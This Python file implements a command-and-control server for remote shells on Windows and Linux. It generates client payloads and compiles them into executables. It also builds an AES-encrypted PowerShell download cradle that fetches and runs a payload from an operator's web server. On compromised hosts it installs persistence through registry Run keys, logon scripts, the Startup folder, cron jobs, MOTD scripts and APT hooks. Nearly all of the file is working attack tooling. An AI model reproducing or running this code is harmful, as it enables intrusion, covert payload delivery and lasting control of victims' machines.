import socket
import threading
from prettytable import PrettyTable
import random
import string
import os
import os.path
import shutil
import subprocess
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad
import base64

def help():
    print("MENU COMMANDS \n ---------------------------------------\n listener -g : Generate a new listener\n winclient.py - Generate a Windows compatible client\n linclient.py - Generate a Linux compatible payload\n execlient - Generate an executable payload for Windows\n pshell_cradle : Commands to send encrypted payload to Windows clients\n shell : Enter local shell\n sessions -l : List sessions\n session -i <session number> : Enter the required session\n kill <session number> : Kill an active session\n exit : Exit the code \n")
    print("SESSION COMMANDS \n ---------------------------------------\n background : Backgrounds the current session\n exit : Terminated the current session\n")
def kill_sig(conn,msg):
    msg = str(msg)
    conn.send(msg.encode())
def encrypt_msg(msg,key,iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_msg = pad(msg.encode('utf-16le'), AES.block_size)
    encrypted_msg = cipher.encrypt(padded_msg)
    encrypted_base64 = base64.b64encode(encrypted_msg).decode('utf-16le')
    return encrypted_base64
def winclient():
    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
    filename = name+".py"
    curr_dir = os.getcwd()
    if os.path.exists(curr_dir+"/"+"winclient.py"):
        shutil.copy("winclient.py",filename)
    else:
        print("File not found")
    with open(filename) as f:
        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    with open(filename) as f:
        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
                
def linuxclient():
    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
    filename = name+".py"
    curr_dir = os.getcwd()
    if os.path.exists(curr_dir+"/"+"linuxclient.py"):
        shutil.copy("linuxclient.py",filename)
    else:
        print("File not found")
    with open(filename) as f:
        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    with open(filename) as f:
        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()

def execlient():
    name = (''.join(random.choices(string.ascii_lowercase,k=7)))
    filename = name+".py"
    exename = name+".py"
    curr_dir = os.getcwd()
    if os.path.exists(curr_dir+"/"+"winclient.py"):
        shutil.copy("winclient.py",filename)
    else:
        print("File not found")
    with open(filename) as f:
        new_host=f.read().replace("INPUT_IP_HERE", host_ip)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    with open(filename) as f:
        new_host=f.read().replace("INPUT_PORT_HERE", host_port)
    with open(filename,'w') as f:
        f.write(new_host)
        f.close()
    pyinstaller_exec="pyinstaller " + filename + " -w --clean --onefile --distpath ."
    print("\nCompiling executable file ")
    subprocess.call(pyinstaller_exec,stderr=subprocess.DEVNULL)
    os.remove(name+".spec")
    shutil.rmtree('build')
    if os.path.exists(curr_dir+"/"+exename):
        print("Exe saved in current directory")
    else:
        print("File not found")

def pshell_cradle():
    web_server_ip = input("Enter web server ip\n")
    web_server_port = input("Enter web server port\n")
    payload = input("Enter payload file with extension\n")
    runner = (''.join(random.choices(string.ascii_lowercase,k=7))) + ".txt"
    print(f"Enter following command to start a web server\n python3 -m http.server -b {web_server_ip} {web_server_port}")
    runner_unencoded = f'iex (new-object new.webclient).downloadstring("http://{web_server_ip}:{web_server_port}/{runner}")'
    with open(runner, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload}; Start-Process -FilePath {payload}')
        f.close()
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    aes_runner_encoded = encrypt_msg(runner_unencoded, key,iv)
    print(f'Key : {base64.b64encode(key).decode("utf-16le")}\n')
    print(f'IV : {base64.b64encode(iv).decode("utf-16le")}\n')
    print(f'Encrypted Command\n {aes_runner_encoded}\n')
    print(f'Enter below commands on powershell to download and run runner file\n')
    print(f'$encryptedCommand = {aes_runner_encoded}\n $encryptedKey = {base64.b64encode(key).decode("utf-16le")}\n $encryptedIV = {base64.b64encode(iv).decode("utf-16le")}\n')
    print(f'$decodedCommandBytes = [System.Convert]::FromBase64String($encryptedCommand)\n $decodedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)\n $decodedIVBytes = [System.Convert]::FromBase64String($encryptedIV)\n')
    print(f'$iv = $decodedIVBytes\n $encryptedCommandBytes = $decodedCommandBytes[16..($decodedCommandBytes.Length - 1)]\n')
    print(f'$key = $decodedKeyBytes\n $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider\n $AES.Key = $key\n $AES.IV = $iv\n')
    print(f'$decryptor = $AES.CreateDecryptor()\n $decryptedBytes = $decryptor.TransformFinalBlock($encryptedCommandBytes, 0, $encryptedCommandBytes.Length)\n')
    print(f'$decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)\n')
    print(f'Invoke-Expression $decryptedCommand\n')

def conn_handler():
    while True:
        if kill_flag==1:
            break
        try:
            conn, addr = sock.accept()
            print("Connected with ", addr[0])
            username=conn_in(conn)
            admin=conn_in(conn)
            platform=conn_in(conn)
            if admin==1:
                admin_val="Yes"
            elif username=="root":
                admin_val="Yes"
            else:
                admin_val="No"
            if 'Windows' in platform:
                plat_val = 1
            elif 'Linux' in platform:
                plat_val = 2
            else:
                plat_val = 0
            a.append([conn,addr[0],username,admin_val,plat_val,'Active'])
        except KeyboardInterrupt:
            sock.close()
        except:
            pass

def target_conn(target_id, a, num):
    while True:
        try:
            msg = input('Message to send to client : ')
            if len(msg) == 0:
                continue
            elif msg == 'help':
                pass
            conn_out(target_id, msg)
            if msg == "exit":
                print("closing the connection")
                target_id.close()
                a[num][5]="Dead"
                break
            elif msg == 'background':
                break
            elif msg == 'persist':
                payload = input("Enter the name of payload with extension to enter persistance")
                if a[num][6] == 1:
                    persist_type = input("Enter which type of persistance do you want to use \n 1 for Autorun\n 2 for Startup menu 3 for Logon Script")
                    if persist_type == 1:
                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\Public'
                        conn_out(target_id, persist_command_1)
                        persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload}'
                        conn_out(target_id, persist_command_2)
                        print("Enter following command to clean up registry : \n  reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
                    elif persist_type == 2:
                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\{a[num][2]}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Program\\Startup'
                        conn_out(target_id, persist_command_1)
                        print(f'Enter following command to clean up : \n  del /f C:\\Users\\{a[num][2]}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Program\\Startup')
                    elif persist_type == 3:
                        persist_command_1 = f'cmd.exe /c copy {payload} C:\\Users\\Public'
                        conn_out(target_id, persist_command_1)
                        persist_command_2 = f'reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\Public\\{payload}'
                        conn_out(target_id, persist_command_2)
                        print(f'Enter following command to clean up registry : \n  "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d"')
                    else:
                        print("Enter correct option")
                        pass
                elif a[num][6] == 2:
                    persist_type = input("Enter which type of persistance do you want to use \n 1 for Cronjob\n 2 for MOTD Backdooring(Need to be root) 3 for APT Backdooring(Need to be root)")
                    if persist_type == 1:
                        persist_command_1 = f'echo "*/5 * * * * python3 /home/{a[num][3]}/{payload}" | crontab -'
                        conn_out(target_id, persist_command_1)
                        print("Enter following command to clean up : \n  crontab -r")
                    elif persist_type == 2:
                        persist_command_1 = f'echo "python3 /home/{a[num][3]}/{payload}" >> /etc/update-motd.d/10-uname'
                        conn_out(target_id, persist_command_1)
                        print(f'Enter following command to clean up : \n  sed -i "/python3/d" /etc/update-motd.d/10-uname')
                    elif persist_type == 3:
                        persist_command_1 = f'echo "python3 /home/{a[num][3]}/{payload}" >> /etc/apt/apt.conf.d/01persist'
                        conn_out(target_id, persist_command_1)
                        print(f'Enter following command to clean up : \n  "rm 01persist"')
                    else:
                        print("Enter correct option")
                        pass
            res = conn_in(target_id)
            if res == 'exit':
                print('client closed connection')
                target_id.close()
                a[num][5]= "Dead"
                break
            print('response from client : ', res)
        except KeyboardInterrupt:
            print('\n keyboard interrupt issued')
            msg = "exit"
            conn_out(target_id, msg)
            target_id.close()
            break
        except Exception:
            target_id.close()
            break

def conn_in(conn):
    print('waiting for response')
    res = conn.recv(1024).decode()
    return res
def conn_out(conn, msg):
    msg = str(msg)
    conn.send(msg.encode())
def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('listening for connection')
    sock.listen()
    t1 = threading.Thread(target=conn_handler)
    t1.start()
if __name__=='__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a = []
    listener_count=0
    kill_flag=0
    while True:
        try:
            command = input("Enter Command : ")
            if command == "help":
                help()
            if command == "listener -g":
                if listener_count > 0:
                    print("You already have a listener handle \n")
                    continue
                else:
                    host_ip=input("\nEnter the host ip to listen : ")
                    host_port=input("\nEnter host port to listen : ")
                    listener_handler()
                    listener_count += 1
            if command == "winclient.py":
                if listener_count > 0:
                    winclient()
                else:
                    print("No active listner available")
            if command == "linuxclient.py":
                if listener_count > 0:
                    linuxclient()
                else:
                    print("No active listner available")
            if command == "execlient":
                if listener_count > 0:
                    execlient()
                else:
                    print("No active listner available")
            if command == "pshell_cradle":
                pshell_cradle()           
            if command.split(" ")[0].lower() == "sessions":
                session_counter=0
                if command.split(" ")[1] == "-l":
                    table=PrettyTable()
                    table.field_names = ['Session_id', 'Target_ip','Username','Admin','OS', 'Status']
                    table.padding_width = 3
                    for target in a:
                            table.add_row([str(session_counter),target[1],target[2],target[3],target[4],target[5]])
                            session_counter += 1
                    print(table)
                if command.split(" ")[1] == "-i":
                    try:
                        num = int(command.split(" ")[2])
                        target_id = a[num][0]
                        if a[num][5] == "Active":
                            target_conn(target_id,a,num)
                        else:
                            print("Session is already Dead")
                    except IndexError:
                        print(f'session {num} does not exist')
            if command.split(" ")[0].lower() == "kill":
                try:
                    num = int(command.split(" ")[1])
                    target_id = a[num][0]
                    kill_sig(target_id,'exit')
                    a[num][5] = "Dead"
                    print(f'Terminated session {num}')
                except (IndexError,ValueError):
                    print(f"Session {num} not found")
            if command.split(" ")[0].lower() == "shell":
                print("Dropping into a local shell. Type 'exit' to return to the reverse shell.\n".encode("utf-8"))
                while True:
                    local_command = input("Enter the local command : ")
                    if local_command.strip() == "exit":
                        break
                    result = subprocess.getoutput(local_command)
                    print(str(result))
            if command == "exit":
                quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No : ")
                if quit_msg.lower()=='y':
                    for target in a:
                        if target[5] == "Dead":
                            pass
                        else:
                            conn_out(target[0], "exit")
                    kill_flag=1
                    if listener_count > 0:
                        sock.close()
                    break
                else : 
                    continue
        except KeyboardInterrupt:
            print("\n Keyboard interrupt issued")
            quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No : ")
            if quit_msg.lower()=='y':
                for target in a:
                    if target[5] == "Dead":
                        pass
                    else:
                        conn_out(target[0], "exit")
                kill_flag = 1
                if listener_count > 0:
                    sock.close()
                break
            else : 
                continue

                   







    